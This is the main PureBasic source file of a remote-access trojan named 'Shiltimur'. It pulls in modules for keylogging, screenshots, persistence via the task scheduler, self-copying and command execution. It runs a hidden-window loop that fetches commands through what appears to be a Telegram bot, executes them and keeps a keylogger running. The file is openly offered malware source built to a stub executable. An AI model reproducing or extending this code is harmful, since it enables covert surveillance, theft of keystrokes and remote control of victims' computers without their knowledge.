;main file
XIncludeFile "screenshotter.pbi"
XIncludeFile "customtypes.pbi"
XIncludeFile "commandretriever.pbi"
XIncludeFile "commandexecutor.pbi"
XIncludeFile "keylogger.pbi"
XIncludeFile "persistence.pbi"
XIncludeFile "instancechecker.pbi"
XIncludeFile "launcher.pbi"
XIncludeFile "logger.pbi"
EnableExplicit

Dim commandArray.TelegramMessage(0)
Define ubound.i, i.i, msg.TelegramMessage

OpenWindow(0,0,0,0,0,"Shiltimur Server Window Title",#PB_Window_Invisible | #PB_Window_NoActivate) ;this is for discovery by persistor

SetCurrentDirectory(GetPathPart(ProgramFilename())) ;set self's directory as the working directory. this saves some headaches. i've used some relative paths.

If Not IsUserAdmin_()
  MessageRequester("Error","This program needs to be run with admin privileges.",#PB_MessageRequester_Error)
  End
EndIf

If ProgramParameter()="/task" 
  ;this means we've been executed by task scheduler. fire off new instance of self and exit. this will bring the persistence task's 
  ;state in the scheduler back To "Ready" instead of "Running" which would have been the case if we didn't exit.
  LaunchSelfAndQuit()
EndIf

If IsAnotherInstanceRunning():End:EndIf ;prevent multiple instances

LaunchFromRightFolder() ;copy self to the right folder and run there.

ExtractParamsFromResource() ;gets parameters from exe resource

SetAvailableBotCommands() ;sets available commands to bot. this is just a convenience

Repeat
  
  DoPersistence():LogMsg("DoPersistence() finished")
  RetrieveCommandArray(commandArray()):LogMsg("RetrieveCommandArray() finished")
  ubound=ArraySize(commandArray()) ;commandArray() is assumed 1-indexed
  For i=1 To ArraySize(commandArray()) ;ArraySize() gives max subscript of the array. like UBound()
    msg=commandArray(i)
    ExecuteCommand(@msg):LogMsg("ExecuteCommand() finished")
  Next
  doKeylogging() ;maintains keylog thread
  LogMsg("doKeylogging() finished")
  Delay(1000)

ForEver


; IDE Options = PureBasic 5.70 LTS (Windows - x64)
; CursorPosition = 15
; FirstLine = 2
; EnableAsm
; EnableThread
; EnableXP
; Executable = stub.exe
; EnablePurifier
; Watchlist = RetrieveCommandArray()>reqURL;RetrieveCommandArray()>reqURL;RetrieveCommandArray()>responseBody